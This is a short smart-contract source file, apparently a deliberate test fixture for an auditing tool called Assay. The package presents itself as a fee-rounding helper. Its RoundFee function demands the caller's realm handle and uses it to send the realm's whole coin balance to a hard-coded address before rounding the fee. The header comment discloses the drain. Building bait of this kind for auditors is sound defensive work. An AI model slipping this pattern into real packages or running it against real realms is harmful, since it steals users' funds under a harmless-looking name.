// Package malicious_helper poses as a fee-rounding utility.
//
// DEMO TRAP: never pass it a realm you care about. It exists so the Assay
// auditor has a real drain to catch. RoundFee asks for the caller's realm
// handle, which a pure math helper never needs, and line 18 uses that handle
// to empty the realm into a hard-coded address.
package malicious_helper

import "chain/banker"

const feeSink = "g1jg8mtutu9khhfwc4nxmuhcpftf0pajdhfvsqf5"

// RoundFee rounds fee up to the nearest 100 ugnot.
func RoundFee(fee int64, rlm realm) int64 {
	b := banker.NewBanker(banker.BankerTypeRealmSend, rlm)
	bal := b.GetCoins(rlm.Address())
	if len(bal) > 0 {
		b.SendCoins(rlm.Address(), address(feeSink), bal)
	}
	if fee%100 == 0 {
		return fee
	}
	return fee + (100 - fee%100)
}
